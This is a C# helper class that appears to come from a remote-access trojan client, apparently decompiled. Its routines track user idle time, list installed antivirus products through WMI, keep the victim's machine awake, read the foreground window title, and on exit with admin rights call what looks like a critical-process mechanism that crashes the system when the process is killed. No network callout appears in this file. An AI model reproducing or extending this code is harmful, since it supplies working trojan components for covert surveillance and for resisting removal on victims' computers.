using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using Client.Connection;

namespace Client.Helper;

public static class Methods
{
	private struct LASTINPUTINFO
	{
		[MarshalAs(UnmanagedType.U4)]
		public int cbSize;

		[MarshalAs(UnmanagedType.U4)]
		public int dwTime;
	}

	public static int idletime;

	private static LASTINPUTINFO lastInputInf = default(LASTINPUTINFO);

	public static TimeSpan sumofidletime = new TimeSpan(0L);

	public static int LastLastIdletime;

	public static string Time;

	[DllImport("user32.dll")]
	private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

	public static int GetLastInputTime()
	{
		idletime = 0;
		lastInputInf.cbSize = Marshal.SizeOf((object)lastInputInf);
		lastInputInf.dwTime = 0;
		if (GetLastInputInfo(ref lastInputInf))
		{
			idletime = Environment.TickCount - lastInputInf.dwTime;
		}
		if (idletime > 0)
		{
			return idletime / 1000;
		}
		return 0;
	}

	public static void LastAct()
	{
		while (true)
		{
			Thread.Sleep(1000);
			int lastInputTime = GetLastInputTime();
			if (LastLastIdletime > lastInputTime)
			{
				sumofidletime = sumofidletime.Add(TimeSpan.FromSeconds(LastLastIdletime));
			}
			else
			{
				LastLastIdletime = lastInputTime;
			}
			TimeSpan timeSpan = TimeSpan.FromSeconds(GetLastInputTime());
			string.Format("{0:D2}d:{0:D2}h:{1:D2}m:{2:D2}s:{3:D3}ms", timeSpan.Hours, timeSpan.Minutes, timeSpan.Seconds, timeSpan.Milliseconds);
			TimeSpan timeSpan2 = timeSpan;
			Time = timeSpan2.ToString() ?? "";
		}
	}

	public static bool IsAdmin()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void ClientOnExit()
	{
		try
		{
			if (Convert.ToBoolean(Settings.BDOS) && IsAdmin())
			{
				ProcessCritical.Exit();
			}
			MutexControl.CloseMutex();
			ClientSocket.SslClient?.Close();
			ClientSocket.TcpClient?.Close();
		}
		catch
		{
		}
	}

	public static string Antivirus()
	{
		try
		{
			using ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			List<string> list = new List<string>();
			foreach (ManagementBaseObject item in managementObjectSearcher.Get())
			{
				list.Add(item["displayName"].ToString());
			}
			if (list.Count == 0)
			{
				return "N/A";
			}
			return string.Join(", ", list.ToArray());
		}
		catch
		{
			return "N/A";
		}
	}

	public static ImageCodecInfo GetEncoder(ImageFormat format)
	{
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		foreach (ImageCodecInfo imageCodecInfo in imageDecoders)
		{
			if (imageCodecInfo.FormatID == format.Guid)
			{
				return imageCodecInfo;
			}
		}
		return null;
	}

	public static void PreventSleep()
	{
		try
		{
			NativeMethods.SetThreadExecutionState((NativeMethods.EXECUTION_STATE)2147483651u);
		}
		catch
		{
		}
	}

	public static string GetActiveWindowTitle()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return "";
	}
}
